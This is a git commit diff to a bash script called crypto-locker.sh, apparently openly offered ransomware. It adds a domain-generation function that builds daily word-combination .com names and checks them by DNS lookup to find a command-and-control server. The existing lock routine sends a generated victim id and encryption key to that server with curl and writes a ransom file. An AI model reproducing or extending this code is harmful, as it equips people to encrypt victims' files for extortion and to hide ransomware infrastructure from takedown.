f632c72fd646f740575b63f241149570336c5000
bitslip6 <48876385+bitslip6@users.noreply.github.com>
2019-06-11 15:32:23 -0600

    added support fro random c2
    random c2 server is chosen by generating 10 deterministic words for each day of the year, then randomly combining 3 of them until a valid .com server is found.

--- crypto-locker.sh
+++ crypto-locker.sh
@@ -8,6 +8,35 @@ export root_path=$HOME
 # the path to send the id and decryption key to
 export c2server = "https://www.bitslip6.com/crypto-locker"
 
+find_c2_server () {
+    export month=`date +"%m"`
+    export day=`date +"%d"`
+    #doy = the day of the year
+    doy=$((month*30+day))
+
+    # compute 10 unique words for each day of the year
+    export words=""
+    for i in {1..10}
+    do  
+        line=$((doy*i*50))
+        word=`sed "$line!d" /usr/share/dict/words`
+        words="$words $word"
+    done
+
+    # loop until we find a valid server
+    until [ "$result" -eq "0" ]
+    do  
+        w1=`echo $words|cut -d ' ' -f $(($RANDOM%10+1))`
+        w2=`echo $words|cut -d ' ' -f $(($RANDOM%10+1))`
+        w3=`echo $words|cut -d ' ' -f $(($RANDOM%10+1))`
+        dig @8.8.8.8 "$w1$w2$w3.com"|grep "ANSWER: 1" >/dev/null
+        result=$?
+    done
+        
+    c2server="$w1$w2$w3.com"
+}
+
+
 # decrypt command
 if [ "$cmd" = "dec" ]; then
     /usr/bin/file "$file"|grep -sq openssl;
@@ -32,6 +61,8 @@ fi
 if [ "$cmd" = "lock" ]; then
     id=`openssl rand -base64 32`
     key=`openssl rand -base64 32`
+    # uncomment this line to locate a random c2 server based on the daily algorithm
+    # find_c2_server
     url="$c2server?id=$id&key=$key"
     /usr/bin/curl -s $url>$HOME/ransom.txt
     echo "PID $$ ENCRYPTING: $root_path with [$key]" >> $HOME/ransom.txt
